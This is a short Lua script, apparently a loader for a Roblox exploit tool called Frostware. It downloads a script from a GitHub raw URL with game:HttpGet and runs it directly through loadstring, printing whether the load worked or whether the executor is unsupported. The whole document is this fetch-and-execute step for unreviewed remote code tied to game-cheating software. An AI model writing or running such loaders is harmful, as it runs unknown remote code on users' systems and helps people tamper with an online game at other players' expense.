if executed then
    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Fsploit/Frost/main/F-r-o-s-t-w-a-r-e")
    local success, err = pcall(function()
        loadstring(scriptContent)()
    end)

    if success then
        print("loaded Frostware.")
    else
        print("Executer not supported : " .. err)
    end
end
